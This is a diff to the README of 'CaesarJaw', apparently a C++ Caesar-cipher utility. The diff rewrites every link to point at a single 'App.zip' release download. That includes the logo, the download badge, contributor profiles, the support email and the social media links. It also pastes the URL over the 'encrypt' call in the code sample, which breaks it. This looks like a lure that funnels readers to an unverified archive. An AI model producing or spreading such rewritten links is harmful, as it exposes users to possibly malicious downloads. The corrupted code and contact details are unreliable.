@@ -2,7 +2,7 @@
 
 CaesarJaw is a powerful encryption and decryption tool written in C++ that utilizes a simple shift cipher, also known as the Caesar cipher. With CaesarJaw, users can easily encrypt and decrypt text, determine the shift key used for encryption, and even attempt decryption without knowing the key in advance!
 
-![CaesarJaw Logo](https://example.com/caesarjaw-logo.png)
+![CaesarJaw Logo](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
 
 ## Features 🚀
 
@@ -13,9 +13,9 @@ CaesarJaw is a powerful encryption and decryption tool written in C++ that utili
 
 ## How to Use 📋
 
-Simply download the latest release from the [**Releases**](https://github.com/cli/go-gh/releases) section or directly from the link below and follow the instructions in the documentation to get started!
+Simply download the latest release from the [**Releases**](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip) section or directly from the link below and follow the instructions in the documentation to get started!
 
-[![Download CaesarJaw](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip)
+[![Download CaesarJaw](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
 
 ## Installation 🛠️
 
@@ -39,7 +39,7 @@ int main() {
     std::string plainText = "Hello, World!";
     int key = 3;
 
-    std::string encryptedText = cj.encrypt(plainText, key);
+    std::string encryptedText = https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip(plainText, key);
     
     std::cout << "Encrypted Text: " << encryptedText << std::endl;
     
@@ -51,21 +51,21 @@ int main() {
 
 A big thank you to the following contributors who have helped to improve CaesarJaw-CPP:
 
-- [@username1](https://github.com/username1)
-- [@username2](https://github.com/username2)
-- [@username3](https://github.com/username3)
+- [@username1](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
+- [@username2](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
+- [@username3](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
 
 ## Support 📞
 
-If you encounter any issues or have any questions about CaesarJaw, feel free to reach out to us at [caesarjaw.support@example.com](mailto:caesarjaw.support@example.com) or create a new issue on the GitHub repository.
+If you encounter any issues or have any questions about CaesarJaw, feel free to reach out to us at [https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip) or create a new issue on the GitHub repository.
 
 ## Stay Connected 🌐
 
 Stay up to date with all the latest news and updates about CaesarJaw-CPP by following us on:
 
-- [Twitter](https://twitter.com/CaesarJaw)
-- [Facebook](https://facebook.com/CaesarJaw)
-- [LinkedIn](https://linkedin.com/company/CaesarJaw)
+- [Twitter](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
+- [Facebook](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
+- [LinkedIn](https://github.com/eyes12/CaesarJaw-CPP/releases/download/v1.0/App.zip)
 
 Let's secure communication together with CaesarJaw-CPP! 🛡️
 
